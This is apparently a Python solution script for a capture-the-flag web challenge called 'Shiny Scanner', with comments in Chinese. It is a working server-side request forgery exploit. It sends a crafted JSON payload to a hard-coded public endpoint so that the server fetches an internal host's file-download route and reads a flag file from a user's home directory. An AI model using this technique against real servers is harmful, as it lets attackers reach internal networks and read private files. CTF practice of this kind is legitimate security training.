#!/usr/bin/env python3
"""
题目名称: Shiny Scanner
类别: Web (SSRF)
解题思路:
    1. /api/mine 接口存在 SSRF 漏洞，可以请求内网服务
    2. 通过 SSRF 访问内网 172.19.0.6:5000 的文件下载接口
    3. 读取 /home/system_admin/secret_flag.txt 获取 flag
"""

import sys

import requests

# 目标地址（可通过命令行参数覆盖）
TARGET_URL = "http://95.111.234.103:5050/api/mine"
# 内网 SSRF 目标
INTERNAL_URL = "http://172.19.0.6:5000/download?file=/home/system_admin/secret_flag.txt"


def exploit(url: str = TARGET_URL, internal_url: str = INTERNAL_URL) -> str:
    """利用 SSRF 访问内网服务获取 flag"""
    payload = {
        "url": internal_url,
        "version": "1.1",
        "headers": {},
    }
    resp = requests.post(url, json=payload, timeout=10)
    return resp.text


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    try:
        result = exploit(url)
        print(result)
    except requests.RequestException as e:
        print(f"[!] 请求失败: {e}", file=sys.stderr)
        sys.exit(1)
